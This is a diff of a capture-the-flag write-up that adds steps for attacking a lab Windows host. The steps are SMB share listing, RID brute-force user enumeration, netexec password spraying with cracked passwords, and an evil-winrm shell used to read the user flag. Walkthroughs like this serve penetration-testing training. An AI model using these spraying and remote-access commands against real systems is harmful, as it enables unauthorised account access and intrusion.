@@ -204,7 +204,7 @@ Session completed.
 
 <br />
 
-Cracked password: `stealh1agent`
+Cracked password: `stealth1agent`
 
 <br />
 
@@ -231,6 +231,8 @@ Cracked passwords: `Q4)sJu\Y8qz*A3?d` and `$uperP@ssword`
 
 <br />
 
+## SMB Enumeration
+
 ## Password Spraying Attack
 
 <br />
@@ -254,6 +256,8 @@ $uperP@ssword
 
 To perform the attack, we use `netexec`:
 
+⚠️ NOTE: With the `--continue-on-success` flag, the tool will continue testing all combinations even after finding valid credentials.
+
 <br />
 
 ```bash
@@ -274,4 +278,140 @@ Valid credentials found: `hazard:stealth1agent`
 
 <br />
 
+Let's list the `shares` available for this user:
 
+<br />
+
+```bash
+❯ netexec smb 10.10.10.149 -u hazard -p stealth1agent --shares
+SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
+SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
+SMB         10.10.10.149    445    SUPPORTDESK      [*] Enumerated shares
+SMB         10.10.10.149    445    SUPPORTDESK      Share           Permissions     Remark
+SMB         10.10.10.149    445    SUPPORTDESK      -----           -----------     ------
+SMB         10.10.10.149    445    SUPPORTDESK      ADMIN$                          Remote Admin
+SMB         10.10.10.149    445    SUPPORTDESK      C$                              Default share
+SMB         10.10.10.149    445    SUPPORTDESK      IPC$            READ            Remote IPC
+```
+
+<br />
+
+This user only has read permissions on the `IPC$` share.
+
+As we know, `IPC$` refers to a special administrative share that facilitates inter-process communication between a client and a server, so this share is not useful for further exploitation.
+
+<br />
+
+### User Enumeration via RPC 
+
+<br />
+
+Another technique we can use to leverage the cracked passwords is to enumerate additional users via the `RPC` protocol.
+
+To do this, we can use the `--rid-brute` flag on netexec:
+
+<br />
+
+```bash
+❯ netexec smb 10.10.10.149 -u hazard -p stealth1agent --rid-brute
+SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
+SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
+SMB         10.10.10.149    445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
+SMB         10.10.10.149    445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
+SMB         10.10.10.149    445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+SMB         10.10.10.149    445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+SMB         10.10.10.149    445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
+SMB         10.10.10.149    445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
+SMB         10.10.10.149    445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
+SMB         10.10.10.149    445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
+SMB         10.10.10.149    445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)
+```
+
+<br />
+
+We have two new users: `Chase` and `Jason`
+
+<br />
+
+```bash
+❯ /usr/bin/cat users
+chase
+jason
+hazard
+rout3r
+admin
+```
+
+<br />
+
+Now we can run the spraying attack again:
+
+<br />
+
+```bash
+❯ netexec smb 10.10.10.149 -u users -p passwords --continue-on-success
+SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\chase:stealth1agent STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\jason:stealth1agent STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] Connection Error: Error occurs while reading from remote(104)
+SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\chase:Q4)sJu\Y8qz*A3?d 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\jason:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] Connection Error: Error occurs while reading from remote(104)
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\jason:$uperP@ssword STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE 
+```
+
+<br />
+
+We have a new hit! -> `chase:Q4)sJu\Y8qz*A3?d`
+
+If we test these credentials against `WinRM`, they work as well:
+
+<br />
+
+```bash
+❯ netexec winrm 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'
+WINRM       10.10.10.149    5985   SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk)
+WINRM       10.10.10.149    5985   SUPPORTDESK      [+] SupportDesk\chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)
+```
+
+<br />
+
+Using the `evil-winrm`, we can access the system:
+
+<br />
+
+```bash
+❯ evil-winrm -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Chase\Documents> whoami
+supportdesk\chase
+```
+
+<br />
+
+And get the `user.txt` flag:
+
+<br/>
+
+```bash
+*Evil-WinRM* PS C:\Users\Chase\Desktop> type user.txt
+8dc075d20639f5ed702e0a4ad6xxxxxx
+```
+
+<br />
+
+# Privilege Escalation: chase -> administrator:
+
+<br />
